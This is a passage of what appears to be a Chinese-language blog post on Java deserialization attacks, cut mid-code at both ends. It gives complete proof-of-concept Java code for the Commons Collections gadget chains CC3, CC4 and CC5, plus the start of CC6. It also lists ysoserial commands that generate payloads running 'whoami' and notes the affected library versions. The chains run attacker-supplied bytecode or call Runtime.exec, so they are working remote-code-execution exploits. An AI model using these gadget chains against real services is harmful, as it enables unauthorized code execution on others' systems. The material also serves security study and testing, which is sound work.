class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-comment">//        templatesimpl.newTransformer();</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesimpl&#125;);<br><span class="hljs-comment">//        instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt; ();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class c= Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        Object object= constructor.newInstance(Retention.class,transformedMap);<br>        serializeBase(object);<br>        deserialize(serializeBase(object));<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serializeBase</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String ser)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] base64decodeBytes= Base64.getDecoder().decode(ser);<br>        ByteArrayInputStream data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base64decodeBytes);<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(data);<br>        Object obj= ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="commons-collection-4"><a class="markdownIt-Anchor" href="#commons-collection-4"></a> Commons Collection 4</h3><p>影响版本：jdk无限制，CommonsCollections 4.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections4 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.readObject-&gt;</span>P<span class="hljs-function"><span class="hljs-title">riorityQueue</span>.heapify-&gt;</span>T<span class="hljs-function"><span class="hljs-title">ransformingComparator</span>.compare-&gt;</span>C<span class="hljs-function"><span class="hljs-title">hainedTransformer</span>.transform-&gt;</span>I<span class="hljs-function"><span class="hljs-title">nstantiateTransformer</span>.transform-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.newTransformer-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.getTransletInstance-&gt;</span>T<span class="hljs-function"><span class="hljs-title">emplatesImpl</span>.defineTransletClasses-&gt;</span>TemplatesImpl.defineClass<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesimpl&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        SetFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        String s= serialize(priorityQueue);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然也可以不采用加载字节码改成反射调用Runtime</p><h3 id="commonscollections-5"><a class="markdownIt-Anchor" href="#commonscollections-5"></a> CommonsCollections 5</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">badAttributeValueExpException</span>.readObject-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.toString-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.getValue-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        SetFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span>serialize(badAttributeValueExpException);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commonscollections-6"><a class="markdownIt-Anchor" href="#commonscollections-6"></a> CommonsCollections 6</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections6 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.hashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.getValue-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 